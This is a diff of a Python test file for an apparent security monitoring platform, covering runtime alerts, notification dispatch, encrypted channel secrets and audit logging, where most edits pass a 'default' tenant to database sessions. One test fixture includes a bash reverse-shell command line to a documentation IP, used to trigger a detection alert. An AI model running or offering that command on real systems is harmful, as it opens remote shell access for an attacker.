@@ -347,7 +347,7 @@ def test_runtime_alert_end_to_end(client, transport):
                                                        "min_severity": "medium", "channel_ids": [c["id"]],
                                                        "mitre_techniques": ["T1059"]})
     assert r.status_code == 201, r.text
-    with db.get_session() as s:  # ignore the seeded history
+    with db.get_session("default") as s:  # ignore the seeded history
         while dispatcher.process_events(s):
             pass
         before = s.scalar(select(func.count()).select_from(NotificationDelivery))
@@ -356,7 +356,7 @@ def test_runtime_alert_end_to_end(client, transport):
           "process": {"name": "bash", "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "user": "www-data"}}
     res = client.post("/api/runtime/events", json=ev, headers=AUTH).json()
     assert res["alerts_triggered"] >= 1
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         queued = s.scalars(select(NotificationEvent).where(NotificationEvent.processed_at.is_(None))).all()
         assert any(e.source == "runtime_alert" and e.entity_id in res["alert_ids"] for e in queued)
         dispatcher.process_events(s)
@@ -373,7 +373,7 @@ def test_status_change_and_finding_events(client, transport):
     finding = client.get("/api/findings").json()[0]
     assert client.patch(f"/api/alerts/{alert['id']}", json={"status": "acknowledged"}).status_code == 200
     assert client.patch(f"/api/findings/{finding['id']}", json={"status": "suppressed"}).status_code == 200
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         rows = s.scalars(select(NotificationEvent).where(NotificationEvent.event_type == "status_changed")).all()
         assert {(r.source, r.entity_id) for r in rows} == {("runtime_alert", alert["id"]),
                                                           ("posture_finding", finding["id"])}
@@ -386,9 +386,9 @@ def test_status_change_and_finding_events(client, transport):
 def test_attack_path_poller_baseline_then_new(client, transport):
     from app.notifications.models import NotificationSourceState
 
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         assert dispatcher.poll_sources(s, force=True) == 0  # first poll: baseline only
-        st = s.get(NotificationSourceState, "attack_path")
+        st = s.get(NotificationSourceState, ("default", "attack_path"))
         assert st.state["initialized"] and st.state["seen"]
         st.state = {"initialized": True, "seen": st.state["seen"][1:]}  # forget one: it is "new" now
         s.commit()
@@ -401,7 +401,7 @@ def test_attack_path_poller_baseline_then_new(client, transport):
 # --- API: secrets, RBAC, audit -----------------------------------------------------------------
 
 def _audit(action):
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         return s.scalars(select(AuditLog).where(AuditLog.action == action)).all()
 
 
@@ -416,7 +416,7 @@ def test_channel_secrets_are_encrypted_and_never_returned(client, transport):
     assert ch_out["secret_hints"] == {"url": "https://hooks.example.com/••••••", "signing_secret": "••••zzzz"}
     for path in ("/api/notifications/channels", f"/api/notifications/channels/{ch_out['id']}"):
         assert "TOKEN123456" not in client.get(path).text
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         row = s.get(NotificationChannel, ch_out["id"])
         assert "TOKEN123456" not in row.secret_ciphertext and "TOKEN123456" not in json.dumps(row.config)
         assert crypto.decrypt_secrets(row.secret_ciphertext)["url"].endswith("TOKEN123456")
@@ -425,7 +425,7 @@ def test_channel_secrets_are_encrypted_and_never_returned(client, transport):
     assert r.status_code == 200 and r.json()["secret_hints"]["url"] == "https://hooks.example.com/••••••"
     r = client.patch(f"/api/notifications/channels/{ch_out['id']}", json={"secrets": {"signing_secret": "y" * 40}})
     assert r.status_code == 200 and r.json()["secret_hints"]["signing_secret"] == "••••yyyy"
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         sec = crypto.decrypt_secrets(s.get(NotificationChannel, ch_out["id"]).secret_ciphertext)
         assert sec == {"url": "https://hooks.example.com/in/TOKEN123456", "signing_secret": "y" * 40}
     entries = _audit("notification_channel_created") + _audit("notification_channel_updated")
@@ -473,7 +473,7 @@ def test_test_send_and_delivery_log(client, transport):
     assert [d["status"] for d in log] == ["dead", "sent"]
     assert len(_audit("notification_channel_tested")) == 2
     # dead-lettered event deliveries can be retried by an admin
-    with db.get_session() as s:
+    with db.get_session("default") as s:
         d = NotificationDelivery(channel_id=c["id"], channel_name="SOC", channel_type="slack", kind="event",
                                  title="x", message={"title": "x"}, status="dead", attempts=6)
         s.add(d)
